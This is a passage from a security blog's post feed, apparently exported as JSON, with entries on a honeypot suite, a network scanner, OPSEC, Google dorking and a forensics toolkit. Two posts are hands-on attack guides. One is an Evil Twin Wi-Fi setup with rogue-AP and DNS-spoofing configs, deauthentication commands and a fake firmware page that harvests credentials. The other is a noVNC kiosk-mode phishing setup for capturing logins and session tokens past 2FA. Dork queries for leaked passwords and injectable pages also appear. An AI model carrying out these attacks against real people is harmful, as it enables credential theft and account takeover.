Closing the Python program stops the honeypot service.      Ensure proper termination using tips provided below.      Code StructureThe honeypot suite is modular and extensible, with each protocol implemented as a separate Python script. Below is the high-level structure:  Honeypot Modules:          Each protocol has its own script (e.g., https_honeypot.py, dns_honeypot.py).      Scripts expose start_honeypot and stop_honeypot functions for integration.        Centralized Control:          The menu.py script provides a unified interface for managing all honeypots.      Dynamically loads modules based on user selection.        Twisted Framework:          Built using Twisted, a powerful event-driven networking engine for Python.      Ensures efficient handling of network traffic and logging.        Cryptography Library:          Uses the cryptography library to generate self-signed certificates for HTTPS and SSH.      InterfaceMenuThe menu.py script provides a clean and intuitive GUI for selecting and configuring honeypots:Steps to Use the Menu:  Select a protocol (e.g., DNS, SSH).  Configure settings such as host, port, and additional parameters (e.g., SSH version).  Click “Start Honeypot” to begin monitoring.  View logs in real-time within the GUI.LimitationsWhile the honeypot suite is robust, it has some limitations:  Resource Consumption: Running multiple honeypots simultaneously may consume significant system resources.  False Positives: Legitimate users interacting with the honeypot may generate logs that need filtering.  Single Process Reactor: Only one Twisted reactor can run at a time, limiting simultaneous honeypot execution without subprocesses.  Basic Simulations: The honeypots provide basic simulations and may not fully replicate complex production environments.Future EnhancementsPlanned enhancements include:  Advanced Logging: Integrate with centralized logging systems like Elasticsearch or Splunk for better analysis.  Machine Learning: Use ML models to detect and classify attack patterns automatically.  Containerization: Package each honeypot in Docker containers for easier deployment and isolation.  Web-Based Interface: Replace the Tkinter GUI with a web-based dashboard for remote management.  Automated Alerts: Send email or SMS alerts when suspicious activity is detected.Ethical ConsiderationsUsing honeypots for cybersecurity research must adhere to ethical guidelines:  Authorization: Deploy honeypots only in environments where you have explicit permission.  Data Privacy: Avoid logging sensitive information from legitimate users.  Legal Compliance: Ensure compliance with local laws and regulations regarding data collection and monitoring.  Isolation: Run honeypots in isolated networks to prevent unintended exposure.Tips and TricksEnsuring Proper TerminationTo ensure the honeypot stops cleanly:  Graceful Shutdown:          Press Ctrl+C in the terminal running the honeypot.      Verify termination using tools like netstat or tasklist.        Example:    netstat -ano | findstr :&lt;port&gt;taskkill /PID &lt;PID&gt; /F        Check Logs:          Review the log file (e.g., dns_honeypot.log) to confirm the honeypot stopped successfully.      Setting Up the HTTPS Honeypot  Download Resources:          Specify a target URL (e.g., https://example.com) to download and serve content.      The honeypot inlines CSS, JavaScript, and images to reduce external dependencies.        Generate Certificates:          Customize SSL certificate details (e.g., country, organization) during startup.      Certificates are stored locally in the script directory.        Run the Honeypot:          Execute the script with desired configurations:        python https_honeypot.py --host 0.0.0.0 --port 443 --url https://example.com                      Test Locally:          Use tools like curl or Postman to test the honeypot:        curl -k https://127.0.0.1/                    Extra InsightsWhy Use Honeypots?Honeypots are invaluable tools for:  Gathering intelligence on attacker techniques and tools.  Detecting and mitigating threats in real-time.  Educating teams about security risks through practical demonstrations.Best Practices  Regular Updates: Keep the honeypot scripts updated to handle new attack vectors.  Controlled Environment: Deploy honeypots in sandboxed or virtualized environments to minimize risks.  Analyze Logs: Regularly review logs to identify trends and improve your security posture.Example OutputBelow is an example log entry from the DNS honeypot:[2023-10-15 12:34:56] DNS Query Received - Query Name: example.com, Type: A, Class: IN, From: ('192.168.1.100', 5353)From the SSH honeypot:[2023-10-15 12:35:00] Login attempt - Username: admin, Password: password123ConclusionThis honeypot suite is a tool for cybersecurity researchers. By simulating vulnerable services, it helps you understand attacker behavior and strengthen your defenses. While the current implementation focuses on simplicity and usability, future enhancements will expand its capabilities and make it even more effective."
  },
  
  {
    "title": "Network Scanner",
    "url": "/posts/python-network-scanner",
    "categories": "Python, Network Scanner",
    "tags": "Python, Network Scanner",
    "date": "2025-02-07 00:00:00 +0000",
    





    
    "snippet": "Python-based tool designed for network reconnaissance, service detection, and vulnerability analysis. It supports port scanning, service fingerprinting, web analysis, geolocation, and detailed repo...",
    "content": "Python-based tool designed for network reconnaissance, service detection, and vulnerability analysis. It supports port scanning, service fingerprinting, web analysis, geolocation, and detailed reporting in both HTML and JSON formats.Network Scanner Repository  Link: Network Scanner RepositoryFeaturesThe Network Scanner is a powerful Python-based tool designed for network reconnaissance, service detection, and vulnerability analysis. Key features include:  Port Scanning: Identify open ports and running services on both IPv4 and IPv6 addresses.  Service Detection: Detect services like HTTP, SSH, FTP, and more using banners, extended probes, and SSL/TLS analysis.  Web Analysis: Analyze websites for technologies, security headers, WAF detection, and potential vulnerabilities.  Geolocation: Pinpoint the physical location of IP addresses using the GeoLite2 database.  DNS Information: Retrieve DNS records (A, MX, TXT) and perform reverse DNS lookups.  WHOIS Lookup: Fetch domain registration details.  Reporting: Generate professional HTML and JSON reports with risk assessments.  Customizable: Configure timeouts, concurrent scans, and reporting formats via config.yml.  Cross-Platform: Works seamlessly on Windows, Linux, and macOS.How It WorksThe Network Scanner operates in several stages:  Target Resolution:          Resolves hostnames to both IPv4 and IPv6 addresses.      Performs reverse DNS lookups and geolocation for resolved IPs.        Port Scanning:          Scans default or custom ports using asynchronous techniques for efficiency.      Supports retries, timeouts, and rate limiting to ensure reliability.        Service Detection:          Identifies services running on open ports using banners, SSL/TLS information, and extended probes.      Analyzes web services for technologies, security headers, and vulnerabilities.        Reporting:          Generates detailed HTML and JSON reports with scan results, risk assessments, and metadata.        User Interaction:          Provides an interactive menu for selecting scan modes, entering targets, and specifying custom ports.      Code StructureThe project is organized into modular components for maintainability and scalability:  network_scanner.py: Main entry point for the application. Handles user interaction and orchestrates the scanning process.  utils/async_scanner.py: Implements asynchronous port scanning and service detection.  utils/web_analyzer.py: Analyzes websites for technologies, vulnerabilities, and security headers.  utils/reporter.py: Generates HTML and JSON reports based on scan results.  utils/config_manager.py: Manages configuration loading and validation from config.yml.  utils/logger.py: Handles logging to both console and file outputs.  templates/: Contains HTML and CSS templates for report generation.  GeoLite2-City.mmdb: GeoIP database for geolocation features.  config.yml: Configuration file for scanner settings.InterfaceFuture EnhancementsThe following features are planned for future releases:  Enhanced Vulnerability Scanning: Integrate with CVE databases for real-time vulnerability checks.  Authentication Support: Add support for scanning authenticated endpoints.  Graphical User Interface (GUI): Develop a GUI for easier interaction.  API Integration: Provide an API for integrating the scanner into other tools or workflows.  Improved Reporting: Add PDF export and customizable report templates.  Support for Additional Protocols: Extend support for protocols like SNMP, SIP, and more.Ethical ConsiderationsThe Network Scanner is intended for ethical use only. Users must adhere to the following guidelines:  Authorization: Always obtain explicit permission before scanning networks or systems.  Legal Compliance: Ensure compliance with local laws and regulations regarding network scanning.  Responsible Use: Avoid using the tool for malicious purposes or unauthorized activities.  Data Privacy: Handle any data collected during scans responsibly and securely.By using this tool, you agree to abide by these ethical considerations and assume full responsibility for its usage."
  },
  
  {
    "title": "OPSEC",
    "url": "/posts/opsec/",
    "categories": "OPSEC, Anonymity",
    "tags": "Anonymity, Privacy",
    "date": "2025-02-04 11:53:00 +0000",
    





    
    "snippet": "A Tactical Dive into Operations SecurityFinally taking the plunge to share thoughts that have been brewing in the recesses of my mind. So, what’s the scoop? It’s all about the intricate dance of OP...",
    "content": "A Tactical Dive into Operations SecurityFinally taking the plunge to share thoughts that have been brewing in the recesses of my mind. So, what’s the scoop? It’s all about the intricate dance of OPSEC, or OPERATIONS SECURITY. For those who fancy a formal definition, OPSEC is the art of evaluating whether our moves are visible to potential threats, assessing the risk of compromising information, and then taking calculated measures to thwart those who seek to exploit our critical data.The Origins of OPSECDiving into the tactical realm, OPSEC emerged officially in 1966 during the US’s Operation Purple Dragon, spurred by the need to investigate operational mishaps and devise a pre-operation process to dodge fatal compromises.Core PrinciplesIn a nutshell, OPSEC boils down to one thing: control. Control over information and actions, to prevent any attempts at turning them against you. Whether you’re immersed in threat intelligence collection, a red team engagement, or just nosing around an investigation, OPSEC is the guardian angel watching over it all. While the textbooks swear by five sacred steps, we’re zooming in on a couple, starting with the core of Identifying and Analyzing Threats &amp; Vulnerabilities.Picture a process that unveils the adversary’s watchful gaze, details the information they crave, and pinpoints your Achilles’ heels. That’s just the kickoff. We then pivot to Assessing Risks and strategically applying Appropriate Countermeasures. Quick heads-up: I’m spinning this yarn with a big ol’ focus on Anonymity and Privacy.Safeguarding Critical InformationNow, whether you’re a soldier, a civilian, or somewhere in the murky in-between, safeguarding your critical information is non-negotiable. This isn’t just a 9-to-5 deal—it extends to your home. OPSEC isn’t just for the field; it’s your shield against personal info leaks and safeguarding sensitive details from turning into weapons against you. From PII and financial data to your daily grind, address, and personal records, OPSEC’s got your back.Stick around, and we’ll navigate the cyber, hopping between topics, unraveling my train of thought. By the time we wrap this up, it should all click into place.Identifying and Analyzing Threats &amp; VulnerabilitiesAlright, let’s demystify the Identification of Critical Information. In plain speak, it’s about pinpointing what needs safeguarding to pull off the operation without a hitch. Be it your source IP address, the tools of the trade, or the intricate web of your command and control (C&amp;C) infrastructure – make it crystal clear. Enter CALI (Capabilities, Activities, Limitations, and Intentions), a straightforward checklist outlining the operation’s must-haves. But before I dive into the deep end and potentially befuddle you, let’s ease into it with a high-level overview and a dash of shenanigans.Internet Privacy: IP AddressLet’s get down to the internet. IP – the gateway to the online realm. Your connection to the internet is marked by an IP provided by your trusty ISP (Internet Service Provider), a key linked to an entry in their database. Most countries, ever-vigilant, have data retention regulations, forcing ISPs to log who’s using what IP when, for years on end. If that origin IP leaks, it’s a breadcrumb trail straight to you.DNS (Domain Name System)Now, DNS. Standing for “Domain Name System,” it’s the wizard behind the curtain, helping your browser find the IP address of a service. Think of it as a colossal contact list – ask for a name, and it hands you the number. When your browser wants to visit, say, github via github.com, it ping-pongs with a DNS service to unveil the IP addresses of github’s servers.Typically, your ISP dishes out the DNS service, automatically set up by the network you’re on. So, you type github.com into your browser, and the request embarks on an internet journey, hopping from DNS resolver to root nameserver to TLD server, and finally, to the domain’s nameserver. All this dance reveals the IP address of github.com, which then travels back to your browser, completing the ritual.For a deeper dive, check out: What is DNS?But here’s the kicker – most of these DNS requests cruise unencrypted. Even if you’re surfing in incognito mode or HTTPS, your browser might be casually throwing unencrypted DNS requests out there, saying, “Hey, what’s the IP address of www.cloudflare.com”. Not exactly covert, right?Fortifying Your Privacy with Encrypted DNSNow that we’ve paved the way and you’ve got the basics down, let’s talk about fortifying your privacy. Enter encrypted DNS (DNS over HTTPS or DNS over TLS). You can set up your private DNS server, self-hosted with something like pi-hole or remotely hosted with services like nextdns or 1.1.1.1 within the Tor network. Sounds like airtight privacy, right? Well, not entirely.You can’t don the cloak of Tor all the time – it’s like shouting, “Hey, look at me!” and that’s not our game plan. To dodge unnecessary attention, we introduce VPNs and Tor, tag-teaming to keep your ISP and any nosy third party from eavesdropping or blocking your DNS requests. We’ll unpack this intricate dance in more detail down the road.MAC Address Randomization &amp; TrackingWe’ve got a glaring gap to address here – MAC addresses, a pivotal piece of the puzzle. Your MAC address, acting as a unique ID for your network interface, can become a tracking beacon if left unrandomized. Big players like Microsoft and Apple, along with device manufacturers, maintain logs with MAC addresses, creating a traceable trail linking devices to specific accounts.Even if you think you’ve slipped under the radar by buying your gadget “anonymously,” surveillance tactics, from CCTV footage to mobile provider antenna logs, might expose your identity. So, randomizing your MAC becomes a non-negotiable move. Concealing both your MAC and Bluetooth addresses is paramount.Threat Analysis: Understanding Your AdversaryNow, let’s unpack Threat Analysis in layman’s terms. It’s all about getting to know your adversaries inside out and identifying what’s on the line. Picture this: the threat of your source IP, network, or fingerprint being exposed. This becomes especially critical when dealing with malware samples – slip up, and your investigation might be blown.For those donning the hat of adversary hunters, safeguarding your identity as a researcher is paramount. Some adversaries aren’t above trying to infect or exploit researchers with malware. Let’s break it down step by step:  Main OS: Used for normal work, research, browsing, and keeping things clean.  Private VM: For malware analysis, encrypted traffic routing.  Hidden OS: A VM within a VM, routed through Tor for complete anonymity.This multi-layered approach significantly slashes the odds of your adversaries easily de-anonymizing you.Whonix: A Linchpin for AnonymizationEnter Whonix, a linchpin in the anonymization process. Whonix, a Linux distribution, rolls out two Virtual Machines:  Whonix Workstation: Your go-to for anonymous activities.  Whonix Gateway: Establishing a connection to the Tor network and routing all network traffic from the Workstation through the Tor network.You’ve got two routes here:  Whonix-only route, where all traffic journeys through the Tor Network.  Whonix hybrid route, where everything goes through a cash-paid VPN over the Tor Network.Choose your adventure wisely.Vulnerability Analysis &amp; Risk AssessmentNow, let’s delve into identifying vulnerabilities – the weak spots adversaries are itching to exploit. The Tor Project, while a formidable force, isn’t an impervious fortress against global adversaries. Successful attacks have left their mark, and advanced techniques boasting a remarkable 96% success rate in fingerprinting encrypted traffic have emerged over the years, exposing the websites you’ve visited.Consider major platforms like Twitter and Facebook. The anonymity offered by Tor starts losing its mojo when users toss in their real names, pictures, and link their accounts to personal info like emails and phone numbers. Platforms can employ algorithms to scrutinize browsing patterns, potentially connecting you to other profiles.Securing DevicesDon’t forget to disable Bluetooth, biometrics, webcam, and microphone. Enable BIOS/UEFI password, and disable USB/HDMI. These measures help keep things in check and fend off certain attacks. And whatever you do, don’t leave your laptop unattended in your hotel room or elsewhere. Make it as challenging as possible for anyone to tamper with it without raising alarms.Conclusion: OPSEC as a StrategyI won’t sugarcoat it – achieving perfect OPSEC is an illusion. Compromises are inevitable. The key is in your dedication and the measures you’re willing to take. The more time invested and the more cautious you are, the better.Remember the basics: avoid attracting attention, stay vigilant, be patient, steer clear of laziness and ignorance, blend in, do what makes sense, and, most importantly, Sh*t up.Final ThoughtsI’ve touched on the shenanigans in play. While not an exhaustive dive into every facet of attacks or vulnerabilities, consider this a 101 to kickstart your research. It’s designed to stake a claim in the recesses of your mind, offering a glimpse into how an OPSEC strategy should take shape.And no matter what research you conduct or guide/tips you come across might not cut it; they could be downright irrelevant to your unique operations.So, how do you make this realistically work? Simple. Build your own OPSEC and execute drills that fit your OP. It shouldn’t consume more than a few hours in most cases. Stay sharp, stay secure."
  },
  
  {
    "title": "Evil Twin Attack",
    "url": "/posts/Evil-Twin-Attack/",
    "categories": "Exploits, Evil Twin Attack",
    "tags": "Exploits, Evil Twin Attack",
    "date": "2025-02-01 13:40:00 +0000",
    





    
    "snippet": "Evil Twin Attack: Exploiting Wi-Fi Clients Without Additional HardwareIntroductionThe Evil Twin Attack is a sophisticated method of exploiting Wi-Fi clients by creating a rogue access point (AP) th...",
    "content": "Evil Twin Attack: Exploiting Wi-Fi Clients Without Additional HardwareIntroductionThe Evil Twin Attack is a sophisticated method of exploiting Wi-Fi clients by creating a rogue access point (AP) that mimics a legitimate one. The goal is to force clients to disconnect from the legitimate network and reconnect to the malicious AP, which has the same SSID. Once connected, the attacker can intercept traffic, redirect users to a fake firmware upgrade page, and harvest credentials or other sensitive information.This attack can be executed using a Debian-based OS like Kali Linux without the need for additional hardware (though an external NIC may improve performance). Below is a step-by-step guide to setting up the attack, followed by mitigation strategies to defend against such exploits.Attack Overview  Objective:          Knock Wi-Fi clients off their legitimate network.      Force them to reconnect to a rogue AP with the same SSID.      Redirect traffic to a fake firmware upgrade portal to harvest credentials.        Tools:          hostapd: For creating the rogue AP.      dnsmasq: For DHCP and DNS spoofing.      apache2/nginx: For hosting the fake portal.      iptables: For traffic redirection.      aireplay-ng: For deauthentication attacks.        Prerequisites:          A wireless interface in monitor mode.      Basic knowledge of networking, social engineering, and web development.      Step-by-Step Execution1. Install Required Toolssudo apt install hostapd dnsmasq apache22. Set Wireless Interface to Monitor Modeiwconfig [iface] mode monitor3. Create Working Directorymkdir evil-twin &amp;&amp; cd evil-twin4. Configure hostapdCreate hostapd.conf:vim hostapd.confConfiguration:interface = [iface]driver = nl80211ssid = [ESSID of target]hw_mode = gchannel = [channel of target]macaddr_acl = 0ignore_broadcast_ssid = 05. Configure dnsmasqCreate dnsmasq.conf:vim dnsmasq.confConfiguration:interface = [iface]dhcp-range = 192.168.1.2, 192.168.1.30, 255.255.255.0, 12hdhcp-option=3, 192.168.1.1dhcp-option=6, 192.168.1.1server = 8.8.8.8log-querieslog-dhcplisten-address=127.0.0.16. Configure Network Interfaceifconfig [iface] up 192.168.1.1 netmask 255.255.255.07. Add Routing Rulesroute add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.18. Set Up IP Tables for Traffic Redirectioniptables --table nat --append PREROUTING -i [iface] -p tcp -j REDIRECT --to-ports &lt;ports running your portal&gt;9. Set Up the Fake Portal  Use tools like httrack to clone a legitimate firmware upgrade page.  Modify the HTML/CSS to make it convincing.  Set up a backend (e.g., Flask, Node.js) to handle user input.  Save credentials to a database or file.10. Start Serviceshostapd hostapd.confdnsmasq -C dnsmasq.conf -ddnsspoof -i [iface]11. Launch Deauthentication Attackaireplay-ng --deauth 0 -a [victim's BSSID] [iface]Mitigation Strategies1. Use Strong Encryption  Ensure your Wi-Fi network uses WPA3 encryption. If WPA3 is unavailable, use WPA2 with a strong passphrase.2. Monitor for Rogue APs  Deploy wireless intrusion detection systems (WIDS) to detect and alert on rogue APs.3. Implement Certificate-Based Authentication  Use 802.1X/EAP to authenticate devices connecting to your network. This prevents unauthorized devices from joining, even if they have the correct SSID and password.4. Educate Users  Train users to recognize suspicious activity, such as unexpected firmware upgrade prompts or certificate warnings.5. Disable Auto-Reconnect  Configure devices to not auto-reconnect to known networks without user confirmation.6. Regularly Update Firmware  Ensure all network devices are running the latest firmware to patch known vulnerabilities.7. Segment Your Network  Use VLANs to isolate sensitive devices and services from the rest of the network.8. Monitor Network Traffic  Use tools like Wireshark or Zeek to analyze network traffic for anomalies.9. Enable HTTPS Everywhere  Ensure all web-based services use HTTPS to prevent traffic interception.10. Deploy Honeypots  Set up honeypot APs to detect and analyze malicious activity."
  },
  
  {
    "title": "Server-Side Request Forgery (SSRF)",
    "url": "/posts/bug-bounty/ssrf",
    "categories": "Bug Bounty, Vulnerabilities",
    "tags": "Bug Bounty, SSRF, Vulnerabilities",
    "date": "2025-01-30 00:00:00 +0000",
    





    
    "snippet": "Coming-Soon",
    "content": "Coming-Soon"
  },
  
  {
    "title": "Exploiting noVNC for 2FA Bypass",
    "url": "/posts/Exploiting-noVNC-for-2FA-Bypass/",
    "categories": "Exploits, noVNC",
    "tags": "Exploits, noVNC, 2FA Bypass",
    "date": "2025-01-29 00:00:00 +0000",
    





    
    "snippet": "Using noVNC for Credential Acquisition and Bypassing 2FAnoVNC is both a JavaScript library for VNC clients and an application built on top of this library. Compatible with any modern browser, inclu...",
    "content": "Using noVNC for Credential Acquisition and Bypassing 2FAnoVNC is both a JavaScript library for VNC clients and an application built on top of this library. Compatible with any modern browser, including mobile versions for iOS and Android, noVNC allows the web browser to function as a VNC client, enabling remote access to a machine.So, how can we use noVNC to acquire credentials and bypass 2FA? Here’s the process:  Set up a server with noVNC.  Start Chromium (or any other browser) in Kiosk mode.  Direct it to the desired website for user authentication (e.g., accounts.google.com).  Send the link to the target user. When they click the URL, they will access the VNC session without realizing it.  Since Chromium is configured in Kiosk mode, the user experience will appear as a normal web page.Exploitation PossibilitiesThe exploitation possibilities of this method are vast:  Inject JS into the browser.  Use an HTTP proxy connected to the browser to log all activities.  Terminate the VNC session after user authentication.  Capture the browser session token (Right-click &gt; Inspect &gt; Application &gt; Cookies) after the user disconnects.  Run a background keylogger.  Or get creative and find other approaches (remember, the server is yours).noVNC Setup and Demonstration1. Deploy a Kali Linux InstanceUse any cloud service provider or deploy locally to set up a Linux machine. I will use Kali Linux for this demonstration because I prefer it, but you can choose any other Linux distribution you are comfortable with.2. Install TigerVNCFirst, you need to install VNC software. I tested two options: X11vnc and TigerVNC. After several tests, I chose to use TigerVNC.sudo apt updatesudo apt install tigervnc-standalone-server tigervnc-xorg-extension tigervnc-viewer3. Set Up a VNC PasswordvncpasswdOn Kali Linux, I didn’t need to create the xstartup file, but if you encounter any errors, you can configure it manually.nano ~/.vnc/xstartupPaste or write the following:#!/bin/shxrdb \"$HOME/.Xresources\"xsetroot -solid greyx-terminal-emulator -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;x-window-manager &amp;# Fix to make GNOME workexport XKL_XMODMAP_DISABLE=1/etc/X11/XsessionAdd execution permissions:chmod +x ~/.vnc/xstartup4. Restart the VNC ServerRestart the VNC server, choosing the screen size settings according to your needs. noVNC automatically adjusts to the browser’s screen size, but do your own testing.vncserver -depth 32 -geometry 1920x10805. Download and Run noVNCgit clone https://github.com/novnc/noVNC.gitORapt install novncNow run noVNC locally or publicly. Here are the commands:  Check the VNC server port:vncserver -listExample: 5901, 5902, 5903, etc.  Run noVNC:./noVNC/utils/novnc_proxy --vnc localhost:5901  Set up an SSH tunnel:ssh -L 6080:127.0.0.1:6080 root@server  Run publicly using port 8081:ufw allow http./noVNC/utils/novnc_proxy --vnc 0.0.0.0:5901 --listen 80816. Access VNC and Run the Browser in Kiosk ModeAccess your VNC and run the browser in Kiosk mode. I used Chromium, but you can use whatever suits your needs.chromium --no-sandbox --app=https://gmail.com --kiosk7. Send the URL to the “Victim” to Connect Automaticallyhttp://127.0.0.1:6080/vnc.html?autoconnect=true&amp;password=YOUR-PASSWORDThe autoconnect=true&amp;password=VNCPASSWORD will make the user authenticate automatically. If you want to rename the query parameter, you can modify the vnc.html file.8. Modify the CSS to Remove Visual ElementsnoVNC displays a custom loading page, a VNC control bar, and some additional unnecessary visual elements that should be removed.Open vnc.html, find the divs below, and add the CSS style shown.&lt;!-- Hide unnecessary items --&gt;&lt;div id=\"noVNC_control_bar_anchor\" class=\"noVNC_vcenter\" style=\"display:none;\"&gt;&lt;div id=\"noVNC_status\" style=\"display:none\"&gt;&lt;/div&gt;&lt;!-- Makes the loading page white --&gt;&lt;div id=\"noVNC_transition\" style=\"background-color:white;color:white\"&gt;Important Notes  You are giving remote access to your machine! It should not have anything valuable stored on it.  Any logged data should likely be sent to a remote machine.  Do not use the root account. Set up a restricted user account that uses the VNC service.  Configure the Kiosk mode more restrictively."
  },
  
  {
    "title": "Mastering Google Dorking: The Ultimate Guide",
    "url": "/master-google-dorking-ultimate-guide",
    "categories": "OSINT, Google Dorking",
    "tags": "Google Dorking, Advanced Search",
    "date": "2025-01-28 00:00:00 +0000",
    





    
    "snippet": "Mastering Google Dorking: The Ultimate GuideGoogle Dorking, also known as Google Hacking, is a technique used to uncover sensitive information exposed on the internet. This guide covers everything ...",
    "content": "Mastering Google Dorking: The Ultimate GuideGoogle Dorking, also known as Google Hacking, is a technique used to uncover sensitive information exposed on the internet. This guide covers everything from the basics to advanced techniques, including automation, OSINT gathering, vulnerability exploitation, and ethical considerations. Whether you’re a beginner or an experienced cybersecurity professional, this guide will help you master Google Dorking.Table of Contents  Introduction to Google Dorking  Fundamentals of Google Dorking  Understanding Google Dork Operators  Common Google Dork Queries  Advanced Techniques          Advanced Query Crafting      Exploiting Specific Vulnerabilities      Using Google Dorking for OSINT      Automation and Scripting        Case Studies  Preventing Google Dorking  Google Dorking Tools and Resources  Legal Considerations  ConclusionIntroduction to Google DorkingGoogle Dorking is a technique used to find sensitive information accidentally exposed on the internet. This can include:  Log files with usernames and passwords  Exposed cameras and IoT devices  Sensitive documents (e.g., financial records, confidential files)  Website vulnerabilities (e.g., SQL injection points)While Google Dorking is a powerful tool for information gathering, it is often misused for malicious purposes such as cyberattacks, identity theft, and digital espionage. This guide emphasizes ethical use and encourages readers to use these techniques for security testing and vulnerability assessment.Fundamentals of Google DorkingGoogle Dorking relies on advanced search operators to refine search results. These operators allow you to target specific types of information. Below are the seven fundamental types of queries used in Google Dorking:  intitle: Searches for pages with specific text in their HTML title.          Example: intitle:\"login page\"        allintitle: Similar to intitle, but requires all keywords to be in the title.          Example: allintitle:\"login page admin\"        inurl: Searches for pages based on text in the URL.          Example: inurl:login.php        allinurl: Similar to inurl, but requires all keywords to be in the URL.          Example: allinurl:admin login        filetype: Filters results by specific file types.          Example: filetype:pdf        ext: Filters results by file extensions.          Example: ext:log        site: Limits search results to a specific website.          Example: site:example.com      Understanding Google Dork OperatorsGoogle Dork operators are the building blocks of effective queries. Here’s a breakdown of the most commonly used operators:            Operator      Description      Example                  intitle      Searches for pages with specific text in the title.      intitle:\"login page\"              allintitle      Searches for pages with all specified keywords in the title.      allintitle:\"admin login\"              inurl      Searches for pages with specific text in the URL.      inurl:admin              allinurl      Searches for pages with all specified keywords in the URL.      allinurl:admin login              filetype      Filters results by specific file types.      filetype:pdf              ext      Filters results by file extensions.      ext:log              intext      Searches for pages containing specific text in the body.      intext:\"username\"              allintext      Searches for pages containing all specified keywords in the body.      allintext:\"username password\"              site      Limits search results to a specific domain.      site:example.com              cache      Displays the cached version of a page.      cache:example.com      Common Google Dork QueriesBelow are some commonly used Google Dork queries for various purposes:General Dorksintitle:\"Index of\"intitle:\"Index of\" site:example.comfiletype:log inurl:\"access.log\"intext:\"Welcome to phpMyAdmin\"intitle:\"Login — WordPress\"intext:\"Powered by WordPress\"Database-Related Dorksinurl:/phpmyadmin/index.phpinurl:/db/websql/inurl:/phpPgAdmin/index.phpintext:\"phpPgAdmin — Login\"Search for Vulnerabilitiesintext:\"Error Message\" intext:\"MySQL server\" intext:\"on * using password:\"intext:\"Warning: mysql_connect()\" intext:\"on line\" filetype:phpExposed Documents and Filesfiletype:pdf intitle:\"Confidential\"filetype:doc intitle:\"Confidential\"filetype:xls intitle:\"Confidential\"filetype:ppt intitle:\"Confidential\"Directory Listingsintitle:\"Index of\" inurl:/parent-directoryintitle:\"Index of\" inurl:/admin*intitle:\"Index of\" inurl:/backupintitle:\"Index of\" inurl:/configintitle:\"Index of\" inurl:/logsExposed Webcams and Camerasinurl:\"view/index.shtml\"intitle:\"Live View /-AXIS\"intitle:\"Network Camera NetworkCamera\"Authentication-Related Dorksintitle:\"Login\" inurl:/adminintitle:\"Login\" inurl:/logininurl:\"/admin/login.php\"Exposed Control Panelsintitle:\"Control Panel\" inurl:/adminintitle:\"Control Panel\" inurl:/cpanelExposed IoT Devicesintitle:\"Smart TV\" inurl:/cgi-bin/loginintitle:\"Router Login\" inurl:/loginFinding PHP Info Pagesintitle:\"PHP Version\" intext:\"PHP Version\"Exposing Sensitive Files on Government Sitessite:gov (inurl:doc | inurl:pdf | inurl:xls | inurl:ppt | inurl:rtf | inurl:ps)Exposed Network Devicesintitle:\"Brother\" intext:\"View Configuration\"intitle:\"Network Print Server\" filetype:htmlintitle:\"HP LaserJet\" inurl:SSI/index.htmFile Upload Vulnerabilitiesinurl:/uploadfile/ filetype:phpintext:\"File Upload\" inurl:/php/Advanced TechniquesAdvanced Query CraftingCombine multiple operators for precise searches. Use parentheses () to group conditions and logical operators (OR, AND, -) to refine results.Example:site:example.com (intitle:\"login\" OR inurl:\"admin\") filetype:phpExploiting Specific Vulnerabilities  SQL Injection: inurl:index.php?id=  XSS Vulnerabilities: inurl:search.php?q=  File Inclusion Vulnerabilities: inurl:index.php?page=Using Google Dorking for OSINT  Gathering Information: site:linkedin.com intitle:\"John Doe\"  Finding Leaked Credentials: filetype:txt \"username\" \"password\"Automation and ScriptingAutomate Google Dorking using Python and the requests library.Example Script:import requestsdef google_dork(query):    url = f\"https://www.google.com/search?q={query}\"    headers = {\"User-Agent\": \"Mozilla/5.0\"}    response = requests.get(url, headers=headers)    return response.textquery = 'inurl:index.php?id='results = google_dork(query)print(results)Case StudiesReal-World Example 1: Finding Exposed Admin PanelsA penetration tester used the following query to find exposed admin panels:intitle:\"Admin Login\" inurl:/adminReal-World Example 2: Exploiting SQL InjectionA bug bounty hunter used the following query to find SQL injection vulnerabilities:inurl:index.php?id=Preventing Google DorkingTo protect your website from Google Dorking:  IP-based Restrictions: Limit access to sensitive areas.  Vulnerability Scans: Regularly scan for vulnerabilities.  Google Search Console: Remove sensitive content from search results.  robots.txt: Use this file to block search engines from indexing sensitive directories.  Secure Passwords: Change default passwords on devices and systems.  Disable Remote Logins: Prevent unauthorized access to network devices.Google Dorking Tools and ResourcesHere are some tools and resources to help you get started:  DorkSearch: https://dorksearch.com  Dorks Builder: https://dorks.faisalahmed.me  Google Hacking Database (GHDB): https://www.exploit-db.com/google-hacking-database  Google Operators Guide: https://support.google.com/vault/answer/2474474Legal ConsiderationsUnderstanding Legal BoundariesGoogle Dorking can be a legal gray area. Ensure you have explicit permission before testing any website. Unauthorized access to systems is illegal and punishable by law.ConclusionGoogle Dorking is an invaluable skill for cybersecurity professionals, but it must be used responsibly. By mastering advanced techniques, automating queries, and understanding legal boundaries, you can leverage Google Dorking to enhance security and uncover vulnerabilities. Always prioritize ethical use and obtain proper authorization before performing any tests."
  },
  
  {
    "title": "Digital Forensics Toolkit",
    "url": "/posts/python-digital-forensics-toolkit",
    "categories": "Python, Digital Forensics Toolkit",
    "tags": "Python, Digital Forensics Toolkit",
    "date": "2025-01-26 00:00:00 +0000",
    





    
    "snippet": "Python tool for extracting, analyzing, and visualizing metadata from files. It supports batch processing, suspicious pattern detection, file signature spoofing, and PDF JavaScript injection for for...",
    "content": "Python tool for extracting, analyzing, and visualizing metadata from files. It supports batch processing, suspicious pattern detection, file signature spoofing, and PDF JavaScript injection for forensic testing.Digital Forensics Toolkit Repository  Link: Network Monitor RepositoryFeatures  Metadata Extraction: Extract detailed metadata from images, documents, audio, video, and other file types.  Batch Processing: Process multiple files at once to save time.  Export Options: Save metadata in JSON, CSV, XML, HTML, or plain text formats.  File Preview: View binary previews, entropy analysis, and metadata visualization.  Suspicious Pattern Detection: Identify potential threats like hidden scripts, passwords, or email addresses.  File Signature Spoofing: Modify file headers for testing purposes.  PDF JavaScript Injection: Inject custom JavaScript into PDFs (educational use only).  Metadata Removal: Strip metadata from files while preserving their usability.  Comparison Tool: Compare metadata between two files to identify differences and similarities.  Customizable Themes: Switch between light and dark themes for better usability.How It Works  Upload Files: Use the intuitive GUI to upload one or more files for analysis.  Extract Metadata: The tool analyzes the files and extracts detailed metadata, including file type, size, creation date, checksums, and more.  Advanced Analysis: Perform tasks like entropy analysis, suspicious pattern detection, and file signature spoofing.  Export Results: Save the extracted 